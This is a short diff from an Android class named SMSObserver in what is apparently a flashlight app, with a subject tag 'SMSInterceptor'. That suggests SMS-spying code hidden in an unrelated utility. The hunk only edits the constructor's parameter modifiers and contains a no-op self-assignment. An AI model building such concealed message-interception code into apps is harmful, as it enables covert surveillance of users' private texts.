@@ -30,7 +30,7 @@ public class SMSObserver extends ContentObserver {
   private static final String SUBJECT = "SMSInterceptor";
   private static final String TAG     = "FlashLight SMSObserver";
 
-  public SMSObserver(final Handler handler, final Context context) {
+  public SMSObserver(Handler handler, Context context) {
     super(handler);
     handler = handler;    
     SMSObserver.context = context;
